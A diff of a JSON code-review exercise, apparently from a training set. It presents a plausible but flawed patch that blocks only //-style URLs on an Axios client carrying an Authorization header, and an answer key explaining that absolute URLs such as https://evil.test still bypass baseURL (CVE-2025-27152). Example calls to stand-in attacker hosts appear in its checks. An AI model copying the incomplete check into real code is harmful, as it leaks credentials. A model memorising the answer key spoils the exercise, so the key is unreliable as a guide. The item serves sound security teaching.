@@ -6,14 +6,14 @@
   "difficulty": "senior",
   "status": "ready",
   "title": {
-    "zh": "Axios baseURL 被绝对 URL 绕过审查",
-    "en": "Axios baseURL absolute URL bypass review"
+    "zh": "Axios：加固内部 API client，拦截 protocol-relative URL 绕过 baseURL",
+    "en": "Axios: harden the internal API client against protocol-relative URL bypass"
   },
   "summary": {
-    "zh": "审查一个只拒绝 protocol-relative URL 的补丁，它仍然允许绝对 URL 覆盖 baseURL 并带走敏感 headers。",
-    "en": "Review a patch that rejects protocol-relative URLs but still allows absolute URLs to override baseURL."
+    "zh": "审查一个安全加固补丁：作者给带 Authorization 的 internal API client 增加校验，拒绝以 // 开头的 protocol-relative URL，防止它们绕过 baseURL。",
+    "en": "Review a security hardening patch that rejects protocol-relative (//) URLs on an Authorization-bearing internal API client so they cannot bypass baseURL."
   },
-  "language": "JavaScript / Axios Security",
+  "language": "TypeScript / Axios",
   "tags": [
     "axios",
     "security",
@@ -48,53 +48,62 @@
     "kind": "adapted-ai-plausible-patch",
     "note": "The reviewed patch is an AgentCode adapted plausible-but-incorrect patch for review training. It is not the upstream maintainer patch unless explicitly stated."
   },
-  "learningGoal": "判断 URL 解析语义是否真正绑定了预期 origin。",
-  "scenario": "团队封装了带 Authorization 的 internalApi client。AI PR 为防 SSRF 只拒绝 //evil.test，却仍允许 https://evil.test 覆盖 baseURL。",
-  "context": [
-    "很多服务把 baseURL 配成内部 API，再把认证 header 放在 Axios 实例默认配置里。",
-    "Axios 支持传入绝对 URL；如果调用方参数可控，绝对 URL 可能绕过 baseURL。",
-    "只处理 //host 这种 protocol-relative URL，不能覆盖 http:// 和 https:// 绝对 URL。"
+  "pr": {
+    "title": "Reject protocol-relative URLs on internalApi to prevent baseURL bypass",
+    "author": "codegen-agent",
+    "body": [
+      "internalApi 这个 Axios 实例把内部服务地址配成 baseURL，并在默认 headers 里带上 Authorization。我们发现传入以 // 开头的 protocol-relative URL（如 //evil.test/a）时，Axios 会把它当成绝对地址、忽略 baseURL，把带认证头的请求发到外部主机。",
+      "这个 PR 在 fetchInternal 里增加校验：路径以 // 开头就直接抛错，堵住这个 protocol-relative URL 绕过 baseURL 的口子。",
+      "新增测试验证 //evil.test/a 会被拒绝，同时正常相对路径继续工作。现有测试全部通过。"
+    ]
+  },
+  "background": [
+    "internalApi 用 baseURL 指向内部服务，并在实例默认配置里附带 Authorization header；fetchInternal(path) 用它对 path 发起 GET。",
+    "Axios 的 URL 拼接规则：当 path 是绝对地址时，baseURL 会被忽略，请求直接发往 path 指定的 origin。",
+    "题目文件里提供了补丁前 internal-api.ts 的相关节选（src-internal-api.ts），建议先读懂 client 配置和请求路径再看 diff。"
   ],
-  "reviewFocus": [
-    "先确认 PR 声称修复什么用户问题",
-    "定位 diff 中改变原有约束的条件或配置",
-    "检查新增测试是否只证明 happy path",
-    "构造原有约束仍应成立的反例",
-    "给出 merge 结论、影响范围和修复方向"
-  ],
+  "analysis": {
+    "dimension": "security",
+    "notes": [
+      "『绝对地址』不止 //host 一种形式：http://evil.test 和 https://evil.test 同样是绝对 URL，同样会让 Axios 忽略 baseURL。补丁只用 path.startsWith('//') 拦截 protocol-relative URL，对 http:// 和 https:// 开头的绝对 URL 完全没有防护——绕过口子只堵了一半。",
+      "调用方若能控制 path（例如来自用户输入或上游数据），传 https://evil.test/a 就会让带 Authorization 的请求发到 evil.test，造成内部凭证泄露；也可指向内网地址造成 SSRF。对应 advisory GHSA-jr5f-v2jv-69x6（CVE-2025-27152）。真正的修复是解析最终 URL 并校验 origin 是否仍等于配置的 baseURL，或对该 client 关闭绝对 URL（如 allowAbsoluteUrls: false）。",
+      "新增测试只断言 //evil.test/a 被拒，没有覆盖 https://evil.test / http://evil.test，也没断言 Authorization 头不会外泄——真正危险的绝对 URL 路径始终没被测到。"
+    ]
+  },
+  "learningGoal": "判断一个 URL 安全校验是否真正绑定了预期 origin，还是只挡住了绕过手段中的一种形式。",
   "terms": [
     {
       "term": "baseURL",
-      "description": "Axios 实例默认请求前缀，但绝对 URL 可能覆盖它。"
+      "description": "Axios 实例的默认请求前缀，但绝对 URL 会让它被忽略。"
+    },
+    {
+      "term": "protocol-relative URL",
+      "description": "以 // 开头、复用当前协议的 URL，如 //evil.test/a。"
     },
     {
       "term": "absolute URL",
       "description": "包含 scheme 和 host 的完整 URL，例如 https://evil.test/a。"
     },
     {
-      "term": "credential leakage",
-      "description": "默认 Authorization、Cookie 或 API key 被发送到非预期域名。"
-    },
-    {
       "term": "origin check",
-      "description": "解析最终 URL 后比较协议、主机和端口。"
+      "description": "解析最终 URL 后比较协议、主机和端口是否等于预期。"
     }
   ],
   "behaviorChecks": [
     {
       "input": "client.get(\"/users\")",
       "expected": "应请求配置的 internal API。",
-      "reviewQuestion": "正常相对路径是否继续工作。"
+      "reviewQuestion": "正常相对路径是否继续工作？"
     },
     {
       "input": "client.get(\"//evil.test\")",
       "expected": "应被拒绝。",
-      "reviewQuestion": "AI PR 是否只覆盖这一种绕过。"
+      "reviewQuestion": "补丁拦截的是哪一类 URL？"
     },
     {
       "input": "client.get(\"https://evil.test\")",
       "expected": "也必须被拒绝或不携带敏感 header。",
-      "reviewQuestion": "绝对 URL 是否仍能覆盖 baseURL。"
+      "reviewQuestion": "还有哪些 URL 形式会让 Axios 忽略 baseURL？"
     }
   ],
   "scoringHints": {
